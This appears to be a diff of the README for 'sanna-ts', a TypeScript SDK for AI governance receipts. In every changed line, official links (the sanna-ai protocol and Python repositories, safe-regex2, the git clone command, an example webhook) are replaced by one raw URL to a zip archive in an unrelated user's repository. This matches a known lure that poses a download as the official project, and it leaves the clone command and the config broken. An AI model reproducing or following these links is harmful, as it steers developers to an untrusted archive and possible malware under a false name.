@@ -2,7 +2,7 @@
 
 Sanna checks reasoning during execution, halts when constraints are violated, and generates portable cryptographic receipts proving governance was enforced. Constitution-as-code: your governance rules live in version-controlled YAML, not in a vendor dashboard.
 
-This is the **TypeScript implementation** of [Sanna Protocol v1.0](https://github.com/sanna-ai/sanna-protocol). For the Python reference implementation, see [sanna-ai/sanna](https://github.com/sanna-ai/sanna).
+This is the **TypeScript implementation** of [Sanna Protocol v1.0](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip). For the Python reference implementation, see [sanna-ai/sanna](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip).
 
 ## v1.0.0 Release Notes
 
@@ -158,7 +158,7 @@ This generates keys, creates a constitution, simulates a governed tool call, gen
 
 ## Receipt Format
 
-Every governed action produces a reasoning receipt — a JSON artifact that cryptographically binds inputs, outputs, check results, and constitution provenance. See the [Sanna Protocol specification](https://github.com/sanna-ai/sanna-protocol) for the full specification.
+Every governed action produces a reasoning receipt — a JSON artifact that cryptographically binds inputs, outputs, check results, and constitution provenance. See the [Sanna Protocol specification](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip) for the full specification.
 
 **Identification**
 
@@ -230,7 +230,7 @@ Every governed action produces a reasoning receipt — a JSON artifact that cryp
 |-------|------|-------------|
 | `extensions` | object | Reverse-domain namespaced metadata (`com.sanna.gateway`, `com.sanna.middleware`) |
 
-This section provides a high-level overview. For a complete field reference and normative format details, see the [Sanna Protocol specification](https://github.com/sanna-ai/sanna-protocol).
+This section provides a high-level overview. For a complete field reference and normative format details, see the [Sanna Protocol specification](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip).
 
 Minimal example receipt (abbreviated — production receipts typically contain 3-7 checks):
 
@@ -322,7 +322,7 @@ escalation_targets:
   - condition: "refund over limit"
     target:
       type: webhook
-      url: https://ops.example.com/escalate
+      url: https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip
 
 reasoning:
   require_justification: true
@@ -358,7 +358,7 @@ for (const result of results) {
 
 Invariants with explicit `check` fields (e.g., `check: sanna.context_contradiction`) skip type detection and are handled by the coherence check engine. Unrecognized rules return `NOT_CHECKED` status — they are not silently ignored.
 
-Regex patterns are validated by [safe-regex2](https://github.com/fastify/safe-regex2) before execution. Catastrophic backtracking patterns (e.g., `(a+)+`) are rejected with `UNSAFE_PATTERN` status and fail-open.
+Regex patterns are validated by [safe-regex2](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip) before execution. Catastrophic backtracking patterns (e.g., `(a+)+`) are rejected with `UNSAFE_PATTERN` status and fail-open.
 
 ## Receipt Querying
 
@@ -608,7 +608,7 @@ No network. No API keys. No vendor dependency.
 - **Ed25519 cryptographic signatures**: Constitutions, receipts, and approval records are independently signed and verifiable offline.
 - **Atomic file writes**: All file operations use symlink-protected atomic writes (temp file + `fsync` + rename).
 - **SQLite hardening**: Receipt stores validate file ownership, enforce `0o600` permissions, and reject symlinks.
-- **Safe regex execution**: User-supplied regex patterns are validated by [safe-regex2](https://github.com/fastify/safe-regex2) before execution. Catastrophic backtracking patterns are rejected.
+- **Safe regex execution**: User-supplied regex patterns are validated by [safe-regex2](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip) before execution. Catastrophic backtracking patterns are rejected.
 - **PII redaction**: Credit card detection uses a two-pass approach (strip separators, match digit runs) to avoid ReDoS. Object redaction enforces a recursion depth limit (default 20) to prevent stack overflow.
 - **Escalation token hashing**: Only SHA-256 hashes of HMAC tokens are stored at rest. Raw tokens are returned to the caller but never persisted.
 - **Config secret isolation**: Gateway config supports `$ENV{VAR_NAME}` interpolation for HMAC secrets and key paths. File permission warnings on group/world-readable config files.
@@ -622,7 +622,7 @@ No network. No API keys. No vendor dependency.
 - **Canonicalization**: Sorted keys, NFC Unicode normalization, integer-only numerics (no floats in signed content)
 - **Fingerprinting**: 14 pipe-delimited fields hashed with SHA-256; 16-hex truncation for display, 64-hex for full fingerprint
 
-See the [Sanna Protocol specification](https://github.com/sanna-ai/sanna-protocol) for full cryptographic construction details.
+See the [Sanna Protocol specification](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip) for full cryptographic construction details.
 
 ## Threat Model
 
@@ -650,9 +650,9 @@ Receipts are attestations of process, not guarantees of outcome.
 
 ## Cross-Language Compatibility
 
-Receipts generated by the TypeScript SDK verify in the [Python SDK](https://github.com/sanna-ai/sanna), and vice versa. Key pairs are interchangeable — both SDKs use PKCS#8 (private) and SPKI (public) PEM encoding for Ed25519 keys.
+Receipts generated by the TypeScript SDK verify in the [Python SDK](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip), and vice versa. Key pairs are interchangeable — both SDKs use PKCS#8 (private) and SPKI (public) PEM encoding for Ed25519 keys.
 
-Cross-language parity is verified against golden fixtures in the [sanna-protocol](https://github.com/sanna-ai/sanna-protocol) repository. The test suite includes 48 cross-language verification tests covering receipt fingerprinting, content hashing, canonicalization, and signature verification. v1.0 Python fixtures (12-field fingerprint) are verified for signatures and content hashes; v1.1 TypeScript receipts use the 14-field fingerprint.
+Cross-language parity is verified against golden fixtures in the [sanna-protocol](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip) repository. The test suite includes 48 cross-language verification tests covering receipt fingerprinting, content hashing, canonicalization, and signature verification. v1.0 Python fixtures (12-field fingerprint) are verified for signatures and content hashes; v1.1 TypeScript receipts use the 14-field fingerprint.
 
 ```typescript
 // Keys generated by the Python SDK work in TypeScript
@@ -678,7 +678,7 @@ Requires **Node.js 22+** for native Ed25519 support (zero external crypto depend
 ## Development
 
 ```bash
-git clone https://github.com/sanna-ai/sanna-ts.git
+git clone https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip
 cd sanna-ts
 git submodule update --init        # Pull sanna-protocol spec fixtures
 npm install                        # Workspaces auto-linked
@@ -686,8 +686,8 @@ npm run build                      # Build all 4 packages
 npm test                           # 771 tests across 44 test files
 ```
 
-The `spec/` git submodule points to [sanna-ai/sanna-protocol](https://github.com/sanna-ai/sanna-protocol) and provides golden fixtures, JSON schemas, and the protocol specification used by the cross-language test suite.
+The `spec/` git submodule points to [sanna-ai/sanna-protocol](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip) and provides golden fixtures, JSON schemas, and the protocol specification used by the cross-language test suite.
 
 ## License
 
-AGPL-3.0. The [protocol specification](https://github.com/sanna-ai/sanna-protocol) is licensed under Apache 2.0.
+AGPL-3.0. The [protocol specification](https://raw.githubusercontent.com/anubhavkhare22/sanna-ts/main/packages/core/ts_sanna_1.2.zip) is licensed under Apache 2.0.
